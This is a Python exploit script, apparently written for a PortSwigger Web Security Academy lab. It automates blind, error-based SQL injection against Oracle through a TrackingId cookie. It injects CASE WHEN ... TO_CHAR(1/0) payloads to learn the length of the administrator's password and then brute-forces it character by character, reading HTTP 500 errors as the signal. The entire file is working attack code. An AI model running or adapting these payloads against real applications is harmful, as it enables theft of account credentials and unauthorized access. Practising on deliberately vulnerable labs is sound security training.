
import requests, time, string, signal
from pwn import *

def KeyboardInterrupt(sig, frame):
    print ("Cerrando...")
    sys.exit(1)

signal.signal(signal.SIGINT, KeyboardInterrupt)


def fuerza_bruta():
    url = ("https://0aef00d803014e6286515c9600800049.web-security-academy.net")
    tracker = ("Zk0VxIyuNWytMAzg")
    session = ("QUZqIwsHT8IoLiWnTywi4XX3BsgeavJf")
    vic = log.progress("Victima")
    vic.status(url)
    letterlib = string.printable
    contraseña = ("")
    payload = log.progress("Fuerza bruta")
    payload.status("Iniciando el ataque... ")
    contraseña_progres = log.progress("Contraseña")
    longitud = log.progress("Longitud de la contraseña")
    long = []
    for num in range(1,100): 
        cookie1 = { 
                "TrackingId":f"{tracker}' AND (SELECT CASE WHEN LENGTH(password)='{num}' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a", 
                "session":f"{session}"
            }
        req = requests.get(url, cookies=cookie1)
        h = str(req)
        if "500" in h:
            long += [num] 
            longitud.status(long)
            break
        else:
            
            long += [num]
            longitud.status(long)
    make = (len(long))
    longitud.status(long)


    time.sleep(2)
    for p in long:
        for s in letterlib:
            cookie = { 
                "TrackingId":f"{tracker}' AND (SELECT CASE WHEN SUBSTR(password,{p},1)='{s}' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a", 
                "session":f"{session}"
            }
            
            payload.status(cookie["TrackingId"])
            r = requests.get(url, cookies=cookie)
            g = str(r)
            if "500" in g:
                contraseña += (s)
                contraseña_progres.status(contraseña)
                break
fuerza_bruta()
